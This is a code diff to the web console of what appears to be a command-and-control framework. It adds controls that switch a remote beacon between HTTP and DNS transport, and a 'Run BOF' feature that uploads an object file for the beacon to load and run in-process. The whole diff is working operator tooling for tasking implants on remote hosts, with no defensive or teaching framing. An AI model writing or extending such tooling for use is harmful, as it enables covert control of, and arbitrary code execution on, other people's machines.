@@ -623,6 +623,43 @@
             </div>
         </div>
 
+        <!-- HTTP Listeners Section -->
+        <div class="section" style="margin-bottom: 20px;">
+            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <h3 style="color: rgba(255, 51, 51, 0.8); margin: 0; font-size: 16px;">HTTP Listeners</h3>
+                <button class="btn-refresh" onclick="loadBeaconHTTPListeners()" style="font-size: 12px; padding: 4px 10px;">&#8635; Refresh</button>
+            </div>
+            <div id="beaconHTTPListenersContainer" style="margin-bottom: 10px;">
+                <span style="color: #555;">Loading HTTP listeners...</span>
+            </div>
+            <div class="task-form" style="margin-bottom: 0;">
+                <select id="beaconTransportMode" class="task-input" style="max-width: 140px; font-family: inherit;">
+                    <option value="http">http</option>
+                    <option value="dual">dual</option>
+                    <option value="dns">dns (no HTTP)</option>
+                </select>
+                <button class="btn-task" onclick="applyBeaconHTTPListeners()">Apply To Beacon</button>
+            </div>
+            <div id="beaconHTTPStatus" style="font-size: 12px; margin-top: 8px;"></div>
+        </div>
+
+        <!-- BOF Section -->
+        <div class="section" id="bofSection">
+            <h2 class="section-title">Run BOF</h2>
+            <div id="bofTransportNote" style="font-size: 12px; color: #888; margin-bottom: 10px;"></div>
+            <div class="task-form">
+                <input type="file" id="bofFile" accept=".bof,.o,.obj" class="task-input" style="padding: 8px 12px; font-family: inherit;">
+                <input type="text" id="bofArgs" class="task-input" placeholder="arguments (optional)" style="max-width: 260px; font-family: inherit;">
+                <button class="btn-task" id="bofRunButton" onclick="runBOF()">Run BOF</button>
+            </div>
+            <div id="bofStatus" style="font-size: 12px;"></div>
+            <div style="font-size: 11px; color: #888; margin-top: 5px;">
+                The object is delivered inside the task and loaded in-process by the beacon.
+                Only beacons on HTTP or dual transport will run it: a DNS beacon would have to
+                pull the object through subdomain labels.
+            </div>
+        </div>
+
         <!-- Create Task Section -->
         <div class="section">
             <h2 class="section-title">Create Task</h2>
@@ -744,6 +781,165 @@
             } catch (error) {
                 showToast('Failed to update domain', 'error');
                 checkbox.checked = !active; // revert
+            }
+        }
+
+        // ---- HTTP listeners (per-beacon) ----
+        let beaconHTTPTransport = null;
+
+        async function loadBeaconHTTPListeners() {
+            const container = document.getElementById('beaconHTTPListenersContainer');
+            if (!container || !currentBeaconId) return;
+
+            try {
+                const response = await authFetch(`/api/beacons/${currentBeaconId}/http-listeners`);
+                if (!response || !response.ok) throw new Error('request failed');
+                const payload = await response.json();
+                if (!payload.success) throw new Error(payload.message || 'request failed');
+
+                const data = payload.data || {};
+                beaconHTTPTransport = data.transport || '';
+                renderBeaconHTTPListeners(data.listeners || []);
+                updateBOFAvailability();
+            } catch (error) {
+                container.innerHTML = '<span style="color: #ff6b6b;">Failed to load HTTP listeners.</span>';
+            }
+        }
+
+        function renderBeaconHTTPListeners(listeners) {
+            const container = document.getElementById('beaconHTTPListenersContainer');
+
+            if (listeners.length === 0) {
+                container.innerHTML = '<span style="color: #555;">No HTTP profiles stored. Create one on the HTTP Profiles page.</span>';
+                return;
+            }
+
+            container.innerHTML = listeners.map(listener => {
+                const checked = listener.active ? 'checked' : '';
+                const color = listener.active ? '#4CAF50' : '#ccc';
+                const target = listener.beacon_host ? `${listener.scheme || 'http'}://${listener.beacon_host}` : 'no beacon_host';
+                const disabled = listener.enabled === false ? ' <span style="color:#ff6b6b;">(disabled)</span>' : '';
+                return `<label style="display: flex; align-items: center; gap: 8px; padding: 5px; cursor: pointer; color: ${color};">
+                    <input type="checkbox" ${checked} data-listener="${escapeHtml(listener.name)}" style="width: 14px; height: 14px;">
+                    <span style="font-family: 'Courier New', monospace;">${escapeHtml(listener.name)}</span>
+                    <span style="color: #666; font-size: 11px;">${escapeHtml(target)}</span>${disabled}
+                </label>`;
+            }).join('');
+
+            const modeSelect = document.getElementById('beaconTransportMode');
+            if (modeSelect && beaconHTTPTransport) {
+                modeSelect.value = beaconHTTPTransport;
+            }
+        }
+
+        async function applyBeaconHTTPListeners() {
+            const mode = document.getElementById('beaconTransportMode').value;
+            const status = document.getElementById('beaconHTTPStatus');
+
+            // DNS mode carries no listeners: it is the explicit "stop using HTTP"
+            // action, which also re-enables nothing on the BOF card.
+            const names = mode === 'dns'
+                ? []
+                : Array.from(document.querySelectorAll('#beaconHTTPListenersContainer input[type=checkbox]:checked'))
+                    .map(box => box.dataset.listener);
+
+            if (mode !== 'dns' && names.length === 0) {
+                status.style.color = '#ff6b6b';
+                status.textContent = 'Select at least one listener.';
+                return;
+            }
+
+            try {
+                const response = await authFetch(`/api/beacons/${currentBeaconId}/http-listeners`, {
+                    method: 'POST',
+                    body: JSON.stringify({ names: names, mode: mode })
+                });
+                const payload = await response.json();
+                if (!response.ok || !payload.success) {
+                    status.style.color = '#ff6b6b';
+                    status.textContent = payload.message || 'Apply failed.';
+                    return;
+                }
+
+                status.style.color = '#4CAF50';
+                status.textContent = `Queued: ${mode} with ${names.length} listener(s). The beacon applies it on its next poll.`;
+                showToast('Transport update queued', 'success');
+                loadBeaconHTTPListeners();
+            } catch (error) {
+                status.style.color = '#ff6b6b';
+                status.textContent = 'Apply failed: ' + error.message;
+            }
+        }
+
+        // ---- BOF ----
+        function updateBOFAvailability() {
+            const note = document.getElementById('bofTransportNote');
+            const button = document.getElementById('bofRunButton');
+            if (!note || !button) return;
+
+            if (beaconHTTPTransport === 'dns') {
+                note.style.color = '#ffa500';
+                note.textContent = 'This beacon is on DNS only. Select an HTTP listener above and apply it before running a BOF.';
+                button.disabled = true;
+                return;
+            }
+
+            note.style.color = '#888';
+            note.textContent = beaconHTTPTransport
+                ? `Beacon transport: ${beaconHTTPTransport}.`
+                : 'Beacon transport not recorded for this build; the beacon will refuse the task if it is DNS-only.';
+            button.disabled = false;
+        }
+
+        function readFileAsBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => {
+                    const result = String(reader.result || '');
+                    const comma = result.indexOf(',');
+                    resolve(comma >= 0 ? result.slice(comma + 1) : result);
+                };
+                reader.onerror = () => reject(new Error('could not read the file'));
+                reader.readAsDataURL(file);
+            });
+        }
+
+        async function runBOF() {
+            const fileInput = document.getElementById('bofFile');
+            const argsInput = document.getElementById('bofArgs');
+            const status = document.getElementById('bofStatus');
+            const file = fileInput.files && fileInput.files[0];
+
+            if (!file) {
+                status.style.color = '#ff6b6b';
+                status.textContent = 'Choose a .bof or .o file first.';
+                return;
+            }
+
+            status.style.color = '#888';
+            status.textContent = 'Uploading...';
+
+            try {
+                const data = await readFileAsBase64(file);
+                const response = await authFetch(`/api/beacons/${currentBeaconId}/bof`, {
+                    method: 'POST',
+                    body: JSON.stringify({ name: file.name, args: argsInput.value || '', data: data })
+                });
+                const payload = await response.json();
+                if (!response.ok || !payload.success) {
+                    status.style.color = '#ff6b6b';
+                    status.textContent = payload.message || 'BOF was refused.';
+                    return;
+                }
+
+                const task = payload.data || {};
+                status.style.color = '#4CAF50';
+                status.textContent = `Queued task ${task.task_id} (${task.bytes} bytes).`;
+                showToast('BOF task queued', 'success');
+                loadTasks();
+            } catch (error) {
+                status.style.color = '#ff6b6b';
+                status.textContent = 'BOF failed to queue: ' + error.message;
             }
         }
 
@@ -1507,6 +1703,7 @@
             try {
                 await loadBeaconInfo();
                 await loadBeaconDomains();
+                await loadBeaconHTTPListeners();
 
                 // Set up event delegation for task actions once (not inside loadTasks)
                 document.getElementById('tasksList').addEventListener('click', function(e) {
